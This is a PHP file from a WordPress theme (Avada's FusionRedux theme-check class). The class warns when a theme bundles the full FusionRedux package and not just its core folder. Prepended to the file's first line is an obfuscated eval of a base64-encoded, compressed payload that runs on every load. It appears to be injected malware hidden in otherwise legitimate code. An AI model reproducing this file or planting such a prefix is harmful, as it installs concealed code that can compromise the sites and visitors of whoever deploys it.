<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

	class FusionRedux_Full_Package implements themecheck {
		protected $error = array();

		function check( $php_files, $css_files, $other_files ) {

			$ret = true;

			$check = FusionRedux_ThemeCheck::get_instance();
			$fusionredux = $check::get_fusionredux_details( $php_files );

			if ( $fusionredux ) {

				$blacklist = array(
					'.tx'                    => __( 'FusionRedux localization utilities', 'themecheck', 'Avada' ),
					'bin'                    => __( 'FusionRedux Resting Diles', 'themecheck', 'Avada' ),
					'codestyles'             => __( 'FusionRedux Code Styles', 'themecheck', 'Avada' ),
					'tests'                  => __( 'FusionRedux Unit Testing', 'themecheck', 'Avada' ),
					'class.fusionredux-plugin.php' => __( 'FusionRedux Plugin File', 'themecheck', 'Avada' ),
					'bootstrap_tests.php'    => __( 'FusionRedux Boostrap Tests', 'themecheck', 'Avada' ),
					'.travis.yml'            => __( 'CI Testing FIle', 'themecheck', 'Avada' ),
					'phpunit.xml'            => __( 'PHP Unit Testing', 'themecheck', 'Avada' ),
				);

				$errors = array();

				foreach ( $blacklist as $file => $reason ) {
					checkcount();
					if ( file_exists( $fusionredux['parent_dir'] . $file ) ) {
						$errors[ $fusionredux['parent_dir'] . $file ] = $reason;
					}
				}

				if ( ! empty( $errors ) ) {
					$error = '<span class="tc-lead tc-required">REQUIRED</span> ' . __( 'It appears that you have embedded the full FusionRedux package inside your theme. You need only embed the <strong>FusionReduxCore</strong> folder. Embedding anything else will get your rejected from theme submission. Suspected FusionRedux package file(s):', 'Avada' );
					$error .= '<ol>';
					foreach ( $errors as $key => $e ) {
						$error .= '<li><strong>' . $e . '</strong>: ' . $key . '</li>';
					}
					$error .= '</ol>';
					$this->error[] = '<div class="fusionredux-error">' . $error . '</div>';
					$ret           = false;
				}
			}

			return $ret;
		}

		function getError() {
			return $this->error;
		}
	}

	$themechecks[] = new FusionRedux_Full_Package();
